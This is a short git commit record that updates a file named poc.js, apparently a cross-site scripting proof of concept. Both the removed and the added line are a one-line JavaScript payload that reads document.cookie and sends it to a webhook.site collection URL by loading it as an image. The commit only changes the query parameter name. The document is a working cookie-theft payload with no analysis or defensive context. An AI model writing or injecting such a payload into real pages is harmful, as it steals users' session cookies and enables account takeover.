3cb229eab4a2e96a8246b3268893c79707191eda
wisnuazfar <47131350+azfarwisnu@users.noreply.github.com>
2023-10-05 14:50:54 +0700

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,1 +1,1 @@
-var i=new Image;i.src="https://webhook.site/0848f221-e1ec-40b3-813a-730dce2e7934/?"+document.cookie;
+var i=new Image;i.src="https://webhook.site/0848f221-e1ec-40b3-813a-730dce2e7934/?cookie="+document.cookie;
